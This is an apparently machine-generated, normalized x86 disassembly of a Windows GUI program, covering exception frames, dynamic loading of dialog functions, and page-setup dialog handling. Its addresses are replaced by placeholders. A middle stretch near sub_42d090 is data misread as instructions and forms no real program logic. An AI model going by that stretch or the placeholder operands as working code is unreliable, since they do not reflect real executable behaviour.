mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c4b4
retn
sub_42c4c0
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42c478
xor eax eax
push ebp
push sub_42c677
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c67e
mov eax [ rw-data ]
call sub_42c480
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_42c680
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42c478
xor eax eax
push ebp
push sub_42ca33
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ca3a
mov eax [ rw-data ]
call sub_42c480
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42cde4
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_42ce0c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ce54
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ce5b
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403270
call sub_42c4c0
cmp [ rw-data ] 0x0
jg r-xdata
sub_42ce7c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42cea1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cea8
retn
sub_42ceb4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ced9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cee0
retn
sub_42ceec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42cf11
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cf18
retn
sub_42cf24
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42cf49
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cf50
retn
sub_42cf5c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42cf81
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cf88
retn
sub_42cf94
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42cfb9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cfc0
retn
sub_42cfcc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42cff1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cff8
retn
sub_42d01c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d041
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d048
retn
sub_42d054
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d079
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d080
retn
sub_42d090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
rol [ edx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb cl dl
inc edx
add [ eax ] bh
rol [ edx ] 0x1
pop eax
add [ eax ] al
add [ esp + ebp * 2 ] dl
inc ecx
add ah bl
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add [ eax - 0x23 ] cl
inc edx
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add ah ch
fadd [ edx ]
xor [ ecx + eax * 2 + 0x420be400 ] cl
add [ ebx + ecx * 4 + 0x41 ] cl
add [ esp + ecx + 0xb880042 ] bh
inc edx
add ah cl
or al 0x42
add ah al
or eax 0xff40042
inc edx
add ah bl
or al 0x42
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
movsb [ edi ] [ esi ]
fadd [ edx ]
int3
sub_42d937
dec edi
jo r-xdata
inc edx
add ah bl
or al 0x42
add ah dl
or al 0x42
add ah bh
imul ebp [ edi + 0x6e ] 0xd8540373
inc edx
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmovb eax [ eax ]
xor al 0xea
inc edx
add ah cl
fld [ edx ]
in al dx
in al dx
inc edx
add [ eax ] bl
fiadd [ edx ]
jo r-xdata
inc edx
add [ edx ] al
add ch ch
sub_42d955
fld [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcr cl 0x1
inc edx
add dh bl
fld [ edx ]
lodsb [ esi ]
add al [ eax ]
add [ eax + edx * 8 + 0xfdc0042 ] cl
inc edx
add [ esp + esi + 0x9300040 ] ch
inc edx
add [ esp + esi - 0x22b7ffc0 ] dh
inc edx
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add al ah
0x8c300042 0x41
sub_42db88
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_464a54
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_460ff4
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_460ff4
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_464758
mov edi eax
mov eax ebx
call sub_46473c
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_464724
mov edi eax
mov eax ebx
call sub_464770
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_42dc3c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_42db88
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_42dca4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42086c
mov [ esi + 0x30 ] 0x1
push esi
push sub_42dd80
call sub_4218fc
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_42dcec
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4208b8
test bl bl
jle r-xdata
call sub_421994
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_42dd20
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_467448
mov cl 0x1
sub_42dd48
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4034a8
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42dd80
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42ddaa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42de18
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_45dd48
mov [ ebp - 0x14 ] eax
call sub_45dc64
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42dedb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466d38
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_42dead
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42deb4
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466d94
retn
sub_42deb4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dee2
mov eax [ ebp - 0x14 ]
call sub_45ddfc
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_45dc6c
retn
sub_42df14
push ebp
mov ebp esp
add esp 0xfffff3fc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
lea eax [ ebp - 0xc04 ]
push eax
push ebx
call sub_42bf98
lea ecx [ ebp - 0x804 ]
lea edx [ ebp - 0x404 ]
call sub_42b808
cmp [ ebx ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x404 ]
call sub_4086b4
mov ebx eax
add ebx 0x8
lea eax [ ebp - 0x804 ]
call sub_4086b4
add ebx eax
lea eax [ ebp - 0xc04 ]
call sub_4086b4
add ebx eax
add ebx 0x3
push ebx
push 0x42
call GlobalAlloc
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call GlobalLock
mov esi eax
xor eax eax
push ebp
push sub_42e008
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx esi
add ebx 0x8
mov edi esi
mov eax ebx
sub ax si
mov [ edi ] ax
lea edx [ ebp - 0x804 ]
mov eax ebx
call sub_408718
inc eax
mov ebx eax
mov eax ebx
sub ax si
mov [ edi + 0x2 ] ax
lea edx [ ebp - 0x404 ]
mov eax ebx
call sub_408718
inc eax
mov ebx eax
mov eax ebx
sub ax si
mov [ edi + 0x4 ] ax
lea edx [ ebp - 0xc04 ]
mov eax ebx
call sub_4086f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call GlobalUnlock
retn
sub_42e018
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov ebx eax
xor eax eax
push ebp
push sub_42e084
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi ebx
movzx eax [ esi + 0x4 ]
mov edi ebx
add eax edi
push eax
mov eax [ ebp - 0x4 ]
push eax
call sub_42bf98
movzx ecx [ esi ]
add ecx edi
movzx edx [ esi + 0x2 ]
add edx edi
call sub_42b8b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e08b
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
mov eax [ ebp - 0x8 ]
push eax
call GlobalFree
retn
sub_42e094
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GlobalSize
mov ebx eax
push ebx
push 0x42
call GlobalAlloc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor edx edx
push ebp
push sub_42e116
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
push eax
call GlobalLock
mov esi eax
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GlobalUnlock
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
retn
test eax eax
je r-xdata
mov edx eax
mov eax esi
mov ecx ebx
call sub_4028f0
sub_42e12c
push ebp
mov ebp esp
push ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_424234
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42e193
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x10 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_424ba0
cmp [ ebp + 0xa ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e19a
mov eax [ ebp - 0x4 ]
call sub_403270
retn
mov eax [ ebp + 0x10 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
dec eax
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ rw-data ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_42e1a0
push ebp
mov ebp esp
push ecx
push ebx
mov edx [ ebp + 0xc ]
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x10
mov [ ebp - 0x1 ] 0x0
cmp edx 0x400
jne r-xdata
add edx 0xfffffbff
cmp edx 0x5
ja r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xda ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x1 ]
jmp [ edx * 4 + jump_table_42e251 ]
mov eax [ ebp + 0x10 ]
shr eax 0x10
mov edx eax
sub edx 0x1
je r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0x104 ]
push [ eax + 0x100 ]
call sub_42e12c
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0xf4 ]
push [ eax + 0xf0 ]
call sub_42e12c
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0x114 ]
push [ eax + 0x110 ]
call sub_42e12c
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0x10c ]
push [ eax + 0x108 ]
call sub_42e12c
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0xfc ]
push [ eax + 0xf8 ]
call sub_42e12c
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0xec ]
push [ eax + 0xe8 ]
call sub_42e12c
pop ecx
mov dl 0x1
sub edx 0x2
je r-xdata
sub edx 0x8
je r-xdata
sub edx 0xe
je r-xdata
xor edx edx
jmp r-xdata
and edx 0x7f
mov dl [ edx + rw-data ]
push edx
cmp eax 0xb
setg al
and eax 0x7f
mov al [ eax + rw-data ]
push eax
lea eax [ ebp - 0x1 ]
push eax
mov cx [ ebp + 0x10 ]
and cx 0xffff
mov ebx [ rw-data ]
mov edx [ rw-data ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
jmp r-xdata
sub_42e314
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42dca4
mov ax [ r-xdata ]
mov [ esi + 0x58 ] ax
mov eax esi
call sub_42e558
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_42e35e
add [ eax ] al
push ebx
push esi
push edi
add esp 0xffffffe4
mov edi eax
lea eax [ edi + 0x84 ]
xor ecx ecx
mov edx 0x54
call sub_402c84
lea esi [ edi + 0x84 ]
mov [ esi ] 0x54
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
mov [ esi + 0x3c ] eax
lea edx [ esi + 0xc ]
mov eax esp
call sub_42df14
mov eax [ esp ]
call sub_42e094
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] 0x400
lea eax [ edi + 0x84 ]
push eax
call PageSetupDlgA
mov [ esi + 0x10 ] 0x42002
mov al [ edi + 0xe0 ]
dec al
je r-xdata
add [ esi + 0x10 ] 0x8
dec al
jne r-xdata
test [ edi + 0x58 ] 0x2
je r-xdata
add [ esi + 0x10 ] 0x0
test [ edi + 0x58 ] 0x1
je r-xdata
add [ esi + 0x10 ] 0x4
jmp r-xdata
test [ edi + 0x58 ] 0x4
je r-xdata
add [ esi + 0x10 ] 0x10
test [ edi + 0x58 ] 0x8
je r-xdata
add [ esi + 0x10 ] 0x100
mov [ rw-data ] edi
mov [ esi + 0x48 ] sub_42e1a0
add [ esi + 0x10 ] 0x80000
jmp r-xdata
test [ edi + 0x58 ] 0x20
je r-xdata
add [ esi + 0x10 ] 0x200
test [ edi + 0x58 ] 0x10
je r-xdata
test [ edi + 0x58 ] 0x40
je r-xdata
add [ esi + 0x10 ] 0x20
test [ edi + 0x58 ] 0x80
je r-xdata
add [ esi + 0x10 ] 0x2
test [ edi + 0x59 ] 0x1
je r-xdata
inc [ esi + 0x10 ]
test [ edi + 0x59 ] 0x2
jne r-xdata
add [ esi + 0x10 ] 0x800
test [ edi + 0x59 ] 0x4
je r-xdata
add [ esi + 0x10 ] 0x80
lea ecx [ esp + 0x4 ]
mov edx [ edi + 0x80 ]
mov eax [ edi + 0x7c ]
call sub_416eec
mov eax [ esp + 0x4 ]
mov [ esi + 0x14 ] eax
mov eax [ esp + 0x8 ]
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x68 ]
push eax
lea eax [ esp + 0x10 ]
push eax
mov ecx [ edi + 0x64 ]
mov edx [ edi + 0x60 ]
mov eax [ edi + 0x5c ]
call sub_416f14
push esi
push edi
lea edi [ esi + 0x1c ]
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ edi + 0x78 ]
push eax
lea eax [ esp + 0x10 ]
push eax
mov ecx [ edi + 0x74 ]
mov edx [ edi + 0x70 ]
mov eax [ edi + 0x6c ]
call sub_416f14
push esi
push edi
lea edi [ esi + 0x2c ]
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov [ esi + 0x44 ] sub_42dc3c
lea ecx [ edi + 0x84 ]
mov edx PageSetupDlgA
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
je r-xdata
add [ esi + 0x10 ] 0x200000
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
mov [ edi + 0x7c ] eax
mov eax [ esi + 0x18 ]
mov [ edi + 0x80 ] eax
mov eax [ esi + 0x2c ]
mov [ edi + 0x6c ] eax
mov eax [ esi + 0x30 ]
mov [ edi + 0x70 ] eax
mov eax [ esi + 0x34 ]
mov [ edi + 0x74 ] eax
mov eax [ esi + 0x38 ]
mov [ edi + 0x78 ] eax
mov edx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
call sub_42e018
jmp r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call GlobalFree
mov eax ebx
add esp 0x1c
pop edi
pop esi
pop ebx
retn
push eax
call GlobalFree
sub_42e558
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov ebx eax
lea esi [ ebp - 0x55 ]
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_42e58c
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_42bf98
call sub_42baf8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
xor ecx ecx
mov edx 0x54
call sub_402c84
mov [ esi ] 0x54
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
mov [ esi + 0x3c ] eax
mov al [ ebx + 0xe0 ]
dec al
je r-xdata
add [ esi + 0x10 ] 0x8
dec al
jne r-xdata
test [ ebx + 0x58 ] 0x2
je r-xdata
add [ esi + 0x10 ] 0x0
test [ ebx + 0x58 ] 0x1
je r-xdata
add [ esi + 0x10 ] 0x4
jmp r-xdata
test [ ebx + 0x58 ] 0x4
je r-xdata
add [ esi + 0x10 ] 0x10
test [ ebx + 0x58 ] 0x8
je r-xdata
add [ esi + 0x10 ] 0x100
test [ ebx + 0x58 ] 0x10
je r-xdata
add [ esi + 0x10 ] 0x80000
test [ ebx + 0x58 ] 0x20
je r-xdata
add [ esi + 0x10 ] 0x200
lea ecx [ ebp - 0x60 ]
mov edx [ ebx + 0x80 ]
mov eax [ ebx + 0x7c ]
call sub_416eec
mov eax [ ebp - 0x60 ]
